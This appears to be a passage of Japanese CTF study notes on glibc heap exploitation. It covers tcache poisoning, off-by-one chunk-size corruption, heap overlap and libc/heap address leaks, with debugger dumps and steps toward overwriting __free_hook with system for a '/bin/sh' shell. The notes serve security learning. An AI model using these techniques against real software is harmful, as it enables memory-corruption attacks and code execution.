tcache[0x20] -> addr_B -> EOT      ([2] Bのアドレスで、B-0x8の値(0x21)に対応するtcache[0x21]が上書きされた)
address         value
0x00010000 -> |0x0000000000000021|
0x00010000 -> |0x0000000000000000| ([1] B-0x8の値(0x21)に対応するtcache[0x20]の値(NULL)でBのアドレスの値が上書きされた)
```
##### tcache poisoning
**tcache poisoning**は、mallocするときに再利用するtcache[]に書かれている`チャンク(だと思っている)アドレス-0x8`にある(と思っている)`chunk size`を確認しないことを利用する。   
例えば、以下の状況の時にmallocしようとすると   
```txt
tcache[0x20] -> _free_hook(free関数のアドレスが書いてあるアドレス) -> EOT
```
以下のようにfree関数のアドレスが書いてある場所にAAAAAAAAを書きこめる。   
```txt
# malloc(0x18)前

tcache[0x20] -> _free_hook(free関数のアドレスが書いてあるアドレス) -> EOT
address                 value
_free_hook - 0x8 ->  |0x12345678_12345678| (適当な値)
_free_hook       ->  |0x7fff1234_00000000| (free関数のアドレス)

# malloc(0x18)後    (この時、適当な値0x12345678_12345678がchunk sizeとして適当かどうかのチェックがないのがヤバい！)
                    (普通は、0x21とかが入っているべき)
                    
tcache[0x20] -> EOT (つまり0x00000000_00000000のNULL)
address                 value
_free_hook - 0x8 ->  |0x12345678_12345678| (適当な値) <- ここにあるはずのchunk sizeをチェックしない！
_free_hook       ->  |0x7fff1234_00000000| (free関数のアドレス)  <- B

# read(0,B,0x80) "AAAAAAAA"を入力する

tcache[0x20] -> EOT
address                 value
_free_hook - 0x8 ->  |0x12345678_12345678| (適当な値)
_free_hook       ->  |0x41414141_41414141| (AAAAAAAAが書き込まれる) <- B
```
##### tcacheの通常時の動作
[1] 0x10サイズをmalloc(content)して、`AAAAAAAABBBBBBBB`を書き込む。   
[2] 0x20サイズをmalloc(content)して、`DDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG`を書き込む。   
```txt
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE   <- ox20サイズのチャンクが作成された
Addr: 0x555555757250              0x21の1はPREV_INUSEで直前のチャンク(0x251)が既に使われていることを示す
Size: 0x21

Allocated chunk | PREV_INUSE   <- 0x30サイズのチャンクが作成された
Addr: 0x555555757270              0x31の1はPREV_INUSEで直前のチャンク(0x21)が既に使われていることを示す　
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins                <- free(content)されていないのでtcacheは存在しない
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021  <- 0x10サイズのchunkのtopのアドレス
0x555555757260:	0x4141414141414141	0x4242424242424242  <- 0x10サイズのmalloc(content)が返したアドレス
0x555555757270:	0x0000000000000000	0x0000000000000031  <- 0x20サイズのchunkのtopのアドレス
0x555555757280:	0x4444444444444444	0x4545454545454545  <- 0x20サイズのmalloc(content)が返したアドレス
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```
##### tcacheの7つ埋めたあとにunsorted_binsに入る動作
```txt
for i in range(8):
    store(str(i),"a"*0x80) <- 0x91sizeのchunkを8個確保 
store("0","A")             <- [*] 0x20sizeのchunkを最後にいれる！　これが超大事！！
for i in range(7):
    delete(str(i))         <- [1] これを実行後。7つ分free
delete("7")                <- [2] これを実行後。8個目をfree
---------------------------------------------------------------------------------
[1]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 <- 8個目のchunk まだfreeされていない
0x555555757650:	0x6161616161616161	0x6161616161616161
       ~                 ~                   ~
0x5555557576c0:	0x6161616161616161	0x6161616161616161
0x5555557576d0:	0x0000000000000000	0x0000000000000021 <- 0x21sizeのchunk
0x5555557576e0:	0x0000000041414141	0x0000000000000000
0x5555557576f0:	0x0000000000000000	0x0000000000020911 <- topのchunk
0x555555757700:	0x0000000000000000	0x0000000000000000

---------------------------------------------------------------------------------
[2] delete("7")を実行後 (8個目をfree後)

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757640 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757640 /* '@vuUUU' */

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 <- 8個目のchunkがfreeされて、fd,bkのmain_arenaのアドレスが！
0x555555757650:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757660:	0x6161616161616161	0x6161616161616161
       ~                 ~                   ~ 
0x5555557576c0:	0x6161616161616161	0x6161616161616161
0x5555557576d0:	0x0000000000000090	0x0000000000000020 <- unsorted_binsに登録される際に0x21から0x20に上書き 
0x5555557576e0:	0x0000000041414141	0x0000000000000000    (8個目のchunkがfreeされた＝直前のchunkは使用されていない)
0x5555557576f0:	0x0000000000000000	0x0000000000020911 <- top
0x555555757700:	0x0000000000000000	0x0000000000000000

freeする8個目のchunkの直後のchunk(0x21)はtopではない
-> 直後のchunk(0x21)は使用中である
     -> 直後のchunk(0x21)のPREV_INUSEを0に (0x20に更新)
        直後のchunk(0x21)のPREV_SIZEを更新 (0x90を上書きする)
        
もし、直後のchunkがtopなら、unsorted_binsには登録されずに、topとconsolidateしtopを更新
```
##### tcacheの7つ埋めたあとにfastbinsに入る動作
```txt
-------------------------------------------------------------
free(content)を7回繰り返した後

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x555555757280       <- 7回free(content)されておりリンクが最大の7個ある
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031
0x555555757280:	0x0000555555757280	0x4545454545454545 <- tcache[0x30]に入っている値(アドレス)
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (tcache) | PREV_INUSE                     <- tcacheに積まれる
Addr: 0x555555757270
Size: 0x31
fd: 0x555555757280                                   <- fdはtcache[0x30]の値で上書きされている

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg>

----------------------------------------------------------------------------
8回目の0x30サイズのfree(content)後

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (fastbins) | PREV_INUSE                   <- fastbinsに積まれた！ 
Addr: 0x555555757270                                 <- tcache[0x30]より0x10小さいアドレス
Size: 0x31
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x0               <- tcache[0x30]は7つ分を使い切った
fastbins
0x20: 0x0
0x30: 0x555555757270 ◂— 0x0                     <- 8個目は0x30のサイズが小さいのでfastbinsに積まれる
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031  <- fastbins[0x30]の値（アドレス）
0x555555757280:	0x0000000000000000	0x4545454545454545  <- tcache[0x30]の値（アドレス）
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```
#### off-by-one error
read() で指定文字列を上限に読み込んだあと、ヌルバイト埋めが 1byte だけ溢れる脆弱性。   
Heap問でチャンクサイズを書き換えるのに有効。頻出？   
例)   
0x18サイズをreadに対して"A"\*0x18(24バイト)を入力すると、   
```txt
0x555555757350:	0x0000000000000000	0x0000000000000021 <- 0x20サイズのチャンクの先頭。free済み
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111  <- 0x20 chunkの後に0x110 chunkが存在

MENU
1. Alloc
2. Delete
3. Wipe
0. Exit
> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141 <- 0x20 chunkがtcache[0x20]から取り出されて
0x555555757370:	0x4141414141414141	0x0000000000000100 <- 0x111から0x100に変わった！！
                                                          これで0x100のtcacheをリンクできる！
```

##### off-by-one-errorでchunk sizeを書き換えてヒープのleak
off-by-one-errorでchunk sizeを書き換えて、tcacheを同じサイズをリンクすることで、ヒープのアドレスをleakする   
**[前提条件]**:    
0x100size以上のchunkをmallocできることが必要(な気がする？？)   
`buf[0x100]`みたいに0x100以上の文字を入力できない場合は以下の方法は無理(だよね？)   
mallocが返したアドレスを保存できない場合の問題で出てきた。   
```txt
[1] 0x100サイズをmallocするようにしてfree (実際は0xf8(248)を要求) 
[2] 0x20サイズをmallocしてfree  (実際は0x18(24)を要求) 
[3] 0x110サイズをmallocしてfree (実際は0x108(264)を要求) 
[4] 0x20サイズを再度mallocして(実際は0x18)、0x18分をすべて埋めてoff-by-one-error
    0x20 chunkのすぐ下にある0x110 chunkのchunk sizeが0により、0x111→0x100に変わる
[5] 0x110サイズを再度mallocしてfree
    malloc時は0x110のtcache[0x110]の値(アドレス)を返し、その次のリンク(今はNULL)でtcache[0x110]を上書き
    free時に、malloc時に返されたアドレス-0x8の値(0x100)に対応するtcache[0x100]の値で、malloc時に返されたアドレスを上書き
    malloc時に返されたアドレスで、対応するtcache[0x100]の値を上書き
[6] show関数でmalloc時に返されたアドレスの値を表示できる
    今回はこのアドレスにはfree時に書き込まれたtcache[0x100]が値として存在
    
|   heap    heap |
|                |
|           0x101|
|                | <- tcache[0x100]
|                |
|                |
|    ~        ~  |
|                |
|           0x21 | 
|                | <- tcache[0x20]
|           0x111| <- ここを書き換える！！！
|                | <- tcache[0x110]
|                |
|                |

--------------------------------------------------------------
0x108サイズをmallocして、freeした後

tcachebins
0x20 [  1]: 0x555555757360 ◂— 0x0
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

pwndbg> x/16gx 0x555555757350
0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111
0x555555757380:	0x0000000000000000	0x0000000000000000

--------------------------------------------------------------
0x18サイズをmallocして、freeした後
この時、0x18サイズはすでにtcache[0x20]にあるので、tcache[0x20]の値(アドレス)が使われる！！
さらに下にHeapが伸びない！つまり下のやつを上書きできる！

> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

tcachebins
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021  
0x555555757360:	0x4141414141414141	0x4141414141414141  <- tcache[0x20]にあったアドレスを使った！
0x555555757370:	0x4141414141414141	0x0000000000000100  <- 0x100に変わった！
0x555555757380:	0x0000000000000000	0x0000000000000000

------------------------------------------------------------------
0x108サイズをmallocして、freeした後
mallocは0x108に対応した値tcache[0x110]=0x555555757380を返す

tcachebins
0x100 [  2]: 0x555555757380 —▸ 0x555555757260 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141
0x555555757370:	0x4141414141414141	0x0000000000000100
0x555555757380:	0x0000555555757260	0x0000000000000000 <- tcache[0x100]の値がfree時に書き込まれた！
                                     
-----------------------------------------------------------------
mallocで返されたアドレスの値を表示する

> 2
Content: '`ruUUU'    <- show関数でHeap領域のアドレス(0x0000555555757260)がリークできた！　
Remove? [y/n] n         showできるのはmallocが返したアドレス(0x108に対応するtcache[0x110]=0x555555757380)の値
```

##### off-by-one-errorとHeap leak+tcacheを7つリンク
**[前提条件]**   
0x100以上のsizeのchunkをmallocでき、かつ、mallocが返したアドレスを複数保持できない場合に出てきた。   
```txt
[1] 0x100でmalloc,free (実際は248)
[2] 0x110でmalloc,free (実際は264)
[3] 0x120でmalloc,free (実際は280)
[4] 0x100で再度malloc,off-by-one-error,free
[5] 0x110で再度malloc,off-by-one-error,free
[6] 0x120で再度malloc,off-by-one-error,free
    この時、show関数で直前のmallocが返したアドレス470の値(360)を[6]のfree後に読むことでHeapleakできる！

[1],[2],[3]後                  [4],[5],[6]後

|   heap   heap   |          |   heap   heap   | 
|                 |          |                 |
|          0x100  |          |          0x100  |
|      0          | <- 260   | AAAAAA   AAAAA  |
|                 |          | AAAAAA   AAAAA  |
|                 |          |    ~         ~  |
|                 |          | AAAAAA   AAAAA  |
|          0x110  |          |          0x100  | <- [4]のoff-by-one-error
|      1          | <- 360   |  260     BBBBB  | <- [5]のfreeで、[4]でtcache[0x100]にfreeされた260が上書き
|                 |          | BBBBBB   BBBBB  |
|                 |          |    ~       ~    |
|                 |          | BBBBBB   BBBBB  |
|          0x120  |          | BBBBBB   0x100  | <- [5]のoff-by-one-error
|      2          | <- 470   |  360            | <- [6]のfreeで、[5]でtcache[0x100]にfreeされた360が上書き
|                 |          | CCCCCC   CCCCC  | <- [6]のoff-by-one-errorでこうなる。ここがmallocが返したアドレス

```
#### Heap overlap

```txt
--------------------------------------------------------------------------------
例１）main_arenaのアドレスleakの際に使用
状態：tcache[0x20]がoverlapしている。
再現方法：tcache[0x20]に入っているアドレス(0x555555757ab0)の値をaddr_leakに書き換える
(0x20)   tcache_entry[0](1): 0x555555757ab0 --> addr_leak(leakしたいものがあるアドレス) 
この後に0x20sizeを二回mallocすることで(freeは今回はどっちでもよい)、mallocがaddr_leakを返すようになる

                  top: 0x555555757c30 (size : 0x203d0)
       last_remainder: 0x555555757ac0 (size : 0x100) 
            unsortbin: 0x555555757ac0 (size : 0x100)
(0x20)   tcache_entry[0](1): 0x555555757ab0 --> 0x555555757ad0 (overlap chunk with 0x555555757ac0(freed) )
(0x100)   tcache_entry[14](6): 0x555555757800 --> 0x5555557576c0 --> 0x555555757590 --> 0x555555757470 --> 0x555555757360 --> 0x555555757260
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041
0x555555757ab0: 0x0000555555757ad0      0x555555757000
0x555555757ac0: 0x0000000000000040      0x0000000000000101
0x555555757ad0: 0x00007ffff7dcfca0      0x00007ffff7dcfca0 <- tcache[0x20]の0x555555757ad0が0x00007ffff7dcfca0を指している！
0x555555757ae0: 0x3737373737373737      0x3737373737373737

--------------------------------------------------------------------------------
例2）system("/bin/sh")を呼び出し
状態：tcache[0x100]がoverlapしている
再現方法：tcache[0x100]に入っているアドレス(0x555555757ad0)の値を_free_hookに書き換える
(0x100)   tcache_entry[14](7): 0x555555757ad0  -> _free_hook(0x00007ffff7dd18e8)
この後に、2回0x100サイズをmallocすることで、mallocが_free_hookを返し、そこをaddr_libc_systemに書き換えられる！

                  top: 0x555555757c30 (size : 0x203d0)
       last_remainder: 0x555555757ac0 (size : 0x100) 
            unsortbin: 0x555555757ac0 (doubly linked list corruption 0x555555757ac0 != 0x7ffff7dcbd60 and 0x555555757ac0 is broken)
(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- tcache[0x100]の0x555555757ad0が0x00007ffff7dd18e8(_free_hook)を指している
0x555555757ae0: 0x3737373737373737      0x3737373737373737
```
#### Heap領域の上書きの利用
上書きしたいアドレスがある場合、その上のチャンク(低位のチャンク)のchunk sizeを大きめに書き換えるなりしてfreeでtcacheに入れておけば、 次回書き換えたsizeと同じsizeをmallocしたときに(書き換えたいアドレスの上のチャンクが返る)、多めに上書きできるので、アドレスを上書きできる。   
例)
```txt
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- このアドレスに書き込みたい！
         
         しかし、mallocが0x555555757ab0を返しているときにこのままfreeすると、
         0x20sizeの呼び出し時にこのアドレスがtcache[0x20]から変えることになり、上書きするのにサイズが小さすぎる！
         
         0x21を0x41に何らかの方法で上書きすれば、mallocが0x555555757ab0を返しているときにfreeすると,
         tcache[0x40]にこのアドレスが入り、次に0x40sizeのmallocの時にこのアドレスが返るため、0x20sizeのチャンクに0x40size分書き込める！
```

#### Heap問のlibc leak
main_arenaのアドレスをリークして、offset_libc_arenaで引くとlibc_baseが求まる。   
main_arenaを使用するのはunsorted_binsなので、tcacheを7つ埋めてunsorted_binsを使う。   
unsorted_binsはfd,bkメンバを持ち、ここにはmain_arenaのアドレスが格納される。   
このアドレスをリークする。   
```txt
tcache[0x20] -> 0x20サイズのチャンクのアドレス -> (main_arenaのアドレスが格納されているアドレス)   
```
とすると、0x20のmalloc,freeを2セットすることでリークできる！   

**0x100以上のmallocが可能 AND 複数のmallocのアドレスを保持できない AND libc2.29**   
```txt
-------------------------------------------------------------------------
[1] 0x160サイズをmallocして"A"*0x138+p64(0x41)+p64(0x0000555555757a80)+p64(0x0000555555757a80)で上書きして、free
    0x41サイズの偽のチャンクを作成。
[2] 0x20サイズをmallocして"Y"*0x10+p64(0x40)+p64(0x100)で上書きして、free
    これで、0x555555757acのチャンクをfreeするときにchunkの結合が発生する

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
0x170 [  1]: 0x555555757ad0 ◂— 0x0
                                                  tcache[0x100]の0x555555757950は0x160サイズのチャンクを[1]でfreeした結果
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- [1] [2]の0x41と同じ出ないとダメ
0x555555757a90:	0x0000555555757a80	0x0000555555757a80 <- [1] consolidate時のunlink()でエラーとならないような値をセット
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959 <- [2] 0x20のmallocが返したアドレス。
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- [2] 0x40,0x100を書き込む (元0x170size)

-------------------------------------------------------------------------
0x170サイズのmalloc後　(0x555555757ac0がmallocに返された)
forward consolidateでエラーにならないように0x21の偽のチャンクを用意

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- このチャンクと結合されて、ここが0x141sizeのチャンクの先頭になる
0x555555757a90:	0x0000555555757a80	0x0000555555757a80    unsorted_binsはここを指すようになる
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- 0x100でPREV_INUSEがないので次のfree時にmalloc_consolidate()により、前のchunkと結合される
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x4141414141414141	0x0000000000000021 <- forward consolidateのため
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021 <- forward consolidateが発生しないように！

        freeするchunkの次の次のchunk(0x555555757be0)のPREV_INUSEが0のときforward consolidateが発生し、
        次のchunk(0x555555757bc0)に対してunlink()の処理が入る


-------------------------------------------------------------------------
0x170サイズのmalloc(0x555555757ac0をmallocに返された)のfree後

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80

0x555555757a80:	0x4141414141414141	0x0000000000000141 <- 0x41から0x141に変わった！ (0x141のchunkが作成された！)
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- fd,bkメンバにはmain_arenaのアドレス
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- ここをfreeしてbackward/forward consolidateが発生
0x555555757ad0:	0x4141414141414141	0x4141414141414141    ここのprev_size(0x40)+size(0x100)の合計が結合されて0x141のchunkが作成された！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------------
Input Size: 248
Input Content: 0

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80


0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000141
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
     ~                 ~                    ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021



----------------------------------------------------------------------------------------
0x40サイズをmallocして0x555555757a90を上書き(freeはしない)
unsorted_binsには0x140サイズのチャンクがあるので、0x140bytesのうち0x40だけ使う。
なので、unsorted_binsは0x555555757a80から0x555555757ac0に変わる。
(次にchunkが必要な時は0x555555757ac0から必要な分を切り取る)

mallocが返したアドレス0x555555757a90から書き込めるので、0x555555757ab0に0x0000555555757ad0を上書き
これで、0x0000555555757ad0にあるarena
以下の状況で、
[1] 0x20サイズのmalloc,free
[2] 0x20サイズのmalloc,free

tcachebins
0x20 [  1]: 0x555555757ab0 —▸ 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- 0x141から0x41に変わった！ もしfreeするとtcache[0x40]にこのチャンクが登録される
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0 <- mallocが返した0x555555757a90に書き込めるので
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- tcache[0x20]に0x555555757ad0のリンクを追加
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                  ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------
0x20サイズのmalloc後、freeはしない
この図の場合はfreeすると0x555555757ab0でtcache[0x20]が上書きれてしまうので良くない。freeはしない

tcachebins
0x20 [  0]: 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えればfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- mallocが返したアドレス。mallocしたことでtcache[0x20]が0x0000555555757ad0に！
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~ 
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021


----------------------------------------------------------------------------
前のチャンクはfreeせず、0x20sizeをmalloc後

tcachebins
0x20 [ -1]: 0x7ffff7dcfca0 (main_arena+96)
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- mallocが返したアドレス。show関数でリークできる！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021
```
**0x100以上のmallocができない AND 複数のmallocのアドレスを保持できる AND free時にそのアドレスが消される AND libc2.27**   
```python
# 0x90のchunkを7個作成
for i in range(7):
    store(str(i),str(i)*(0x80) )
# 0x100のchunkを7個作成
